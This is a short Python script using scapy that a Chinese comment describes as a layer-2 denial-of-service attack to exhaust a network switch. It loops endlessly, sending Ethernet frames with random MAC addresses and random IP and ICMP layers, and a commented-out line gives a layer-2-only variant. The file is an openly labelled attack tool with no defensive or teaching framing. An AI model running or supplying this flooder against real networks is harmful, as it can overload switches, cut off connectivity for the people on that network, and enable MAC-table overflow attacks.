import time
from scapy.all import *


# 二层DOS攻击，累死交换机
def main():
    while True:
        # 二层加三层
        packet = Ether(src=RandMAC(), dst=RandMAC())/IP(src=RandIP(), dst=RandIP())/ICMP()
        # 只走二层协议，也一样
        # packet = Ether(src=RandMAC(), dst=RandMAC())
        time.sleep(0.5)
        sendp(packet)
        print(packet.summary())

if __name__ == '__main__':
    main()